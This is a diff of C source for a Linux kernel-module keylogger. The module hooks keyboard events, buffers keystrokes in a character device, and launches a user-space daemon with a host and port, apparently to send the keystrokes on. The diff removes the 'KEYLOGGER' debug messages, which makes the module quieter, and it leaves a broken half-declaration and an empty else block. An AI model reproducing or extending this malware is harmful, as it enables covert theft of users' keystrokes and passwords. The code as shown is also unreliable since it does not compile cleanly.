@@ -21,6 +21,7 @@ static struct device* keyloggerDevice = NULL;
 static char dev_buffer[BUFFER_LEN];
 static short begin = 0;
 static short end = 0;
+static short
 
 /* The prototype functions for the character driver */
 static int     device_open(struct inode *, struct file *);
@@ -44,7 +45,7 @@ static int is_device_full(void)
 int start_deamon(void)
 {
     struct subprocess_info *sub_info;
-    char *argv[] = {"/usr/bin/logger", "help!", NULL};
+    char *argv[] = {"/media/sf_uxp-shared/deamon", "127.0.0.1", "2000", NULL};
     static char *envp[] = {
             "HOME=/",
             "TERM=linux",
@@ -56,7 +57,7 @@ int start_deamon(void)
         return -ENOMEM;
     }
 
-    return call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
+    return call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
 }
 
 int log_key(struct notifier_block *nblock, unsigned long code, void *_param)
@@ -73,9 +74,11 @@ int log_key(struct notifier_block *nblock, unsigned long code, void *_param)
             dev_buffer[end] = (char) (param->value);
             end = (end + 1) % BUFFER_LEN;
             mutex_unlock(&keyloggerDevice->mutex);
-            printk(KERN_ALERT "Wrote %i %i\n", begin, end);
         }
-        printk(KERN_ALERT "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
+        else
+        {
+
+        }
     }
 
     return NOTIFY_OK;
@@ -132,14 +135,13 @@ module_exit(keylogger_exit);
 
 static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
 {
-    printk(KERN_ALERT "KEYLOGGER read %d\n", major);
     mutex_lock(&keyloggerDevice->mutex);
 
+    /* copy data from the kernel data segment to the user data segment */
     unsigned short bytes_read;
     for (bytes_read = 0; begin != end && bytes_read <= length; begin = (begin + 1) % BUFFER_LEN, ++bytes_read)
     {
-        /* put_user copies data from the kernel data segment to the user data segment */
-        put_user(dev_buffer + begin, buffer + bytes_read);
+        put_user(dev_buffer[begin], buffer + bytes_read);
     }
 
     mutex_unlock(&keyloggerDevice->mutex);
@@ -149,19 +151,16 @@ static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_
 
 static ssize_t device_write(struct file *filp, const char *buff, size_t len, loff_t *off)
 {
-    printk(KERN_ALERT "KEYLOGGER write %d\n", major);
     /* Unsupported operation */
     return -EINVAL;
 }
 
 static int device_open(struct inode *inode, struct file *file)
 {
-    printk(KERN_ALERT "KEYLOGGER open %d\n", major);
     return 0;
 }
 
 static int device_release(struct inode *inode, struct file *file)
 {
-    printk(KERN_ALERT "KEYLOGGER release %d\n", major);
     return 0;
 }
